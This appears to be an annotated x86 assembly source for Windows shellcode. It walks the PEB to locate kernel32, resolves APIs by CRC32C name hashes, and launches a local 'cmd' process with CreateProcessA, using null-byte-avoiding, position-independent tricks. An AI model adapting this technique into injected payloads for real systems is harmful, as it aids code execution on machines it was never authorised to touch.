    .section .shcode, "ax"
/* MinGW entrypoint is either _mainCRTStartup or _WinMainCRTStartup */
    .globl _mainCRTStartup
    .def _mainCRTStartup; .scl 2; .type 32; .endef
    .set _mainCRTStartup, _start
    .globl _WinMainCRTStartup
    .def _WinMainCRTStartup; .scl 2; .type 32; .endef
    .set _WinMainCRTStartup, _start
    .globl _start
    .def _start; .scl 2; .type 32; .endef
_start:
    /* fc                */  cld                            /* Clear direction flag */
    /* eb 79             */  jmp    start                   /* Make relative calls negative */

/* Call the function in kernel32 identified by hash in eax */
call_by_hash:
    /* 60                */  pusha                          /* Push eax, ecx, edx, ebx, */
    /* 31 c0             */  xor    %eax, %eax              /*   orig_esp, ebp, esi, edi */
    /* 64 8b 40 30       */  mov    %fs:0x30(%eax), %eax
    /* 8b 40 0c          */  mov    0xc(%eax), %eax         /* eax = PEB->Ldr */
    /* 8b 58 0c          */  mov    0xc(%eax), %ebx         /* ebx = Ldr->InLoadOrderModuleList.Flink */

_find_kernel_module:
    /* 89 de             */  mov    %ebx, %esi              /* Check that the module name begins with K */
    /* ad                */  lods   %ds:(%esi), %eax        /*   because ntdll might be there. */
    /* 89 c3             */  mov    %eax, %ebx              /* ebx = ebx->InLoadOrderLinks.Flink */
    /* 8b 70 30          */  mov    0x30(%eax), %esi        /* esi = ebx->BaseDllName */
    /* ac                */  lods   %ds:(%esi), %al
    /* 24 df             */  and    $0xdf, %al              /* al = toupper(esi[0]) */
    /* 3c 4b             */  cmp    $0x4b, %al
    /* 75 f1             */  jne    _find_kernel_module     /* Loop if not 'K' */

    /* 8b 6b 18          */  mov    0x18(%ebx), %ebp        /* ebp = ebx->DllBase */
    /* 8b 45 3c          */  mov    0x3c(%ebp), %eax        /* eax = IMAGE_DOS_HEADER->e_lfanew */
    /* 8b 5c 05 78       */  mov    0x78(%ebp, %eax, 1), %ebx
                                                            /* ebx = IMAGE_NT_HEADERS->OptionalHeader */
                                                            /*   .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] */
                                                            /*   .VirtualAddress */
    /* 01 eb             */  add    %ebp, %ebx              /* ebx = IMAGE_EXPORT_DIRECTORY - 0x10 to avoid a 0x20 */
    /* 83 eb 10          */  sub    $0x10, %ebx
    /* 8b 4b 28          */  mov    0x28(%ebx), %ecx        /* ecx = ebx->NumberOfNames */
    /* 8b 7b 30          */  mov    0x30(%ebx), %edi        /* edi = ebx->AddressOfNames */
    /* 01 ef             */  add    %ebp, %edi

_find_function:
    /* e3 23             */  jecxz  _not_found              /* int3 if function not found */
    /* 49                */  dec    %ecx                    /* next function */
    /* 8b 34 8f          */  mov    (%edi, %ecx, 4), %esi
    /* 01 ee             */  add    %ebp, %esi              /* Compute CRC32C: */
    /* 31 d2             */  xor    %edx, %edx              /*   esi = name */
    /* 31 c0             */  xor    %eax, %eax              /*   eax = current char/bit index */
                                /*   edx = hash */
_compute_hash_loop:
    /* ac                */  lods   %ds:(%esi), %al         /*   ebx, ecx, edi, ebp: assigned */
    /* 84 c0             */  test   %al, %al
    /* 74 15             */  je     _hash_finished          /* End of name */
    /* 30 c2             */  xor    %al, %dl
    /* b0 08             */  mov    $0x8, %al               /* Repeat for 8 bits */
_compute_hash_bit:
    /* d1 ea             */  shr    %edx                    /* Shift edx and save carry */
    /* 73 06             */  jae    _skip_xor
    /* 81 f2 78 3b f6 82 */  xor    $0x82f63b78, %edx       /* Reversed Castagnoli polynomial */
_skip_xor:
    /* fe c8             */  dec    %al
    /* 75 f2             */  jne    _compute_hash_bit
    /* eb e7             */  jmp    _compute_hash_loop

_not_found:
    /* cc                */  int3

_hash_finished:
    /* 3b 54 24 1c       */  cmp    0x1c(%esp), %edx        /* Compare hash with saved eax */
    /* 75 d4             */  jne    _find_function          /* Loop back to _find_function */

    /* 8b 73 34          */  mov    0x34(%ebx), %esi        /* esi = ebx->AddressOfNameOrdinals */
    /* 01 ee             */  add    %ebp, %esi              /* By the way, eax = 0 */
    /* 66 8b 04 4e       */  mov    (%esi, %ecx, 2), %ax    /* Convert ecx to ordinal ax */
    /* 8b 73 2c          */  mov    0x2c(%ebx), %esi        /* esi = ebx->AddressOfFunctions */
    /* 01 ee             */  add    %ebp, %esi
    /* 8b 04 86          */  mov    (%esi, %eax, 4), %eax
    /* 01 e8             */  add    %ebp, %eax              /* eax = function address */
    /* 89 44 24 1c       */  mov    %eax, 0x1c(%esp)        /* Restore all regs but eax */
    /* 61                */  popa
    /* 50                */  push   %eax                    /* Jump to found function */
    /* c3                */  ret

start:
    /* b8 01 63 6d 64    */  mov    $0x646d6301, %eax
    /* c1 e8 08          */  shr    $0x8, %eax
    /* 50                */  push   %eax                    /* Push "cmd" */
    /* 31 c9             */  xor    %ecx, %ecx
    /* b1 7c             */  mov    $0x7c, %cl              /* Allocate 124 bytes for: */
    /* 29 cc             */  sub    %ecx, %esp              /*   PROCESS_INFORMATION (16) */
    /* 89 e7             */  mov    %esp, %edi              /*   STARTUPINFO (68) */
    /* 31 c0             */  xor    %eax, %eax              /*   10 arguments (40) */
    /* f3 aa             */  rep stos %al, %es:(%edi)       /* ZeroMemory, edi = "cmd" */
    /* 89 7c 24 04       */  mov    %edi, 0x4(%esp)         /* args(lpCommandLine) = edi */
    /* 8d 74 24 28       */  lea    0x28(%esp), %esi        /* esi = &STARTUPINFO */
    /* c6 06 44          */  movb   $0x44, (%esi)           /* esi->cbSize = 68 */
    /* 89 76 f8          */  mov    %esi, -0x8(%esi)        /* args(lpStartupInfo) = esi */
    /* 83 c6 44          */  add    $0x44, %esi             /* esi = &PROCESS_INFORMATION */
    /* 89 74 24 24       */  mov    %esi, 0x24(%esp)        /* args(lpProcessInformation) = esi */
    /* c6 44 24 10 01    */  movb   $0x1, 0x10(%esp)        /* args(bInheritHandles) = TRUE */
    /* c6 44 24 14 10    */  movb   $0x10, 0x14(%esp)       /* args(dwCreationFlags) = CREATE_NEW_CONSOLE */
    /* b8 24 05 1a 7a    */  mov    $0x7a1a0524, %eax       /* Call CreateProcessA */
    /* e8 49 ff ff ff    */  call   call_by_hash
    /* 6a ff             */  push   $0xffffffff             /* args(dwMilliseconds) = INFINITE */
    /* ad                */  lods   %ds:(%esi), %eax
    /* 50                */  push   %eax                    /* args(hHandle) = esi->hProcess */
    /* b8 76 51 94 d8    */  mov    $0xd8945176, %eax       /* Call WaitForSingleObject */
_exit_loop:
    /* e8 3b ff ff ff    */  call   call_by_hash
    /* 31 c9             */  xor    %ecx, %ecx
    /* 51                */  push   %ecx                    /* args(uExitCode) = 0 */
    /* b8 d5 a5 c9 42    */  mov    $0x42c9a5d5, %eax       /* Call ExitProcess */
    /* eb f1             */  jmp    _exit_loop
